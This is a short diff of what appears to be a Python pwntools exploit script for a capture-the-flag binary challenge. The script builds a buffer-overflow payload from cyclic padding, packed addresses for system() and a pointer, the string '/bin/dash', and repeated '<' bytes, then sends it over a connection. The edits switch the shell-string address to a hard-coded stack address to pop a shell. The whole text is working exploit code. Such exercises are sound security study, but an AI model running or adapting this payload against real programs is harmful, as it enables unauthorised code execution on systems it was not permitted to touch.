@@ -54,7 +54,8 @@ padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"
 #payload = padding +sh_addr + system_addr
 sh_addr = system_addr + 0x120d7b
 
-payload = padding  + p32(0xdeadbeef) +  p32(system_addr) +p32(sh_addr)+p32(sh_addr) +p32(0x08048830) + p32(0x08048830)+ p32(0x08048830)
+arbitrary_bash_addr = 0xffffcc04
+payload = padding  + p32(0xdeadbeef) +  p32(system_addr)+p32(arbitrary_bash_addr)+p32(arbitrary_bash_addr) +b"/bin/dash"
 print(f"sh_addr: {str(sh_addr)}")
 payload += b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
 #payload += "<" * 128 #move back 136 bytes -,.\nAB\n".encode() # --> should work
@@ -76,7 +77,6 @@ payload = my_rop
 #payload = p32(0xf7e55db0) # system()
 #payload += my_rop # pop eax  - I might need to call it like 0x128
 payload +=b"\n"
-payload += p32(0x41414141) # system()
 conn.send(payload)
 with open("payload", "ab+") as f:
     f.write(payload)
